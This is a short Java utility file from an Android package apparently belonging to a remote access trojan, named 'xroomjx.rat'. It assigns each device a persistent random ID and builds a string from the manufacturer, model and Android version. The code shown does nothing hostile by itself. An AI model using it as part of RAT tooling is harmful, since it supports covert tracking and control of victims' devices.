package com.xroomjx.rat.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;

import java.util.UUID;

public class Helpers {
    public static String getUID(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("xroomjx", Context.MODE_PRIVATE);
        String uid = prefs.getString("uid", null);
        if (uid == null) {
            uid = UUID.randomUUID().toString();
            prefs.edit().putString("uid", uid).apply();
        }
        return uid;
    }

    public static String getDeviceInfo(Context context) {
        return Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE;
    }
}
